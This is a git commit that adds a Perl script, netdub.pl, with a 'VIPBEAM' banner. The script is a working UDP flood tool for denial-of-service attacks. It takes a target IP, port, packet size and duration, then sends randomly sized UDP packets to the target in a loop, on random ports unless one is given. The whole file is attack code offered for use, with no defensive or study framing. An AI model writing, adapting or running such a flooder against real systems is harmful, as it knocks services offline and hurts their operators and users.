b3451d8c5e6f01b09fbcb9e387dd66edc13ea322
dyogun55 <44761775+dyogun55@users.noreply.github.com>
2018-11-13 16:30:39 +0700

    Add files via upload

---
+++ netdub.pl
@@ -0,0 +1,47 @@
+#!/usr/bin/perl 
+
+use Socket;
+use strict;
+
+if ($#ARGV != 3) {
+  system("clear || cls");
+#Script Banner================================================================
+print q{
+  ===============================================================================
+    ::::::::::::::::::::VIP::  beamm::::::::       
+ :#: Attack DDos...
+:#:Attack DDos...
+:#:HOME-DDos...                 
+ <((Cr.p'bankty))> ===============================================================================
+
+             > VIPBEAM <
+ };
+# INPUT TARGET INFO ==============================================
+ print " \n";
+ print "DDOS NET FIBER:) // \n\n";
+ print "Commande: perl Fiber.pl <IP> <PORT> <size> <TIME>\n";
+  exit(1);
+}
+
+my ($ip,$port,$size,$time) = @ARGV;
+
+my ($iaddr,$endtime,$psize,$pport);
+
+$iaddr = inet_aton("$ip") or die "Impossible de se connecter �  $ip\n";
+$endtime = time() + ($time ? $time : 1000000);
+
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+
+print  "START ATTACK IP $ip
+START ATTACK port " . ($port ? $port : "random"). " \n";
+
+print " \n";
+print  "::::VIPBEAm::::.$100%... \n";
+print "Attaque arrêtée avec Ctrl-C\n" unless $time;
+
+for (;time() <= $endtime;) {
+  $psize = $size ? $size : int(rand(1500-64)+64) ;
+  $psize = $size ? $size : int(rand(1024-64)+64) ;
+  $pport = $port ? $port : int(rand(65500))+300;
+
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
